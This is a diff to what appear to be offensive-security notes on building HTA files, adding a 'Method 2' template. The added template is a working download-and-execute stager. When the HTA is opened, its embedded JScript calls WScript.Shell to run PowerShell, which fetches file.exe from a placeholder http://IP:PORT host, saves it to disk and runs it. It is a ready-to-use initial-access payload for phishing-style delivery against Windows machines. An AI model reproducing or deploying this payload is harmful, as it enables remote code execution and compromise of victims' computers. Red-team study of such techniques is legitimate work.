@@ -92,6 +92,8 @@ DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
 <br>
 
 ## Create HTA file
+
+#### Method 1:
 ```javascript
 <head> 
 <script language="JScript"> 
@@ -133,6 +135,26 @@ self.close();
 </body> 
 </html>
 ```
+<br>
+<br>
+
+#### Method 2:
+```
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("powershell iwr -uri http://IP:PORT/file.exe -outfile
+C:\\path\\to\\file.exe;C:\\path\\to\\file.exe");
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
+```
+
 <br>
 <br>
 
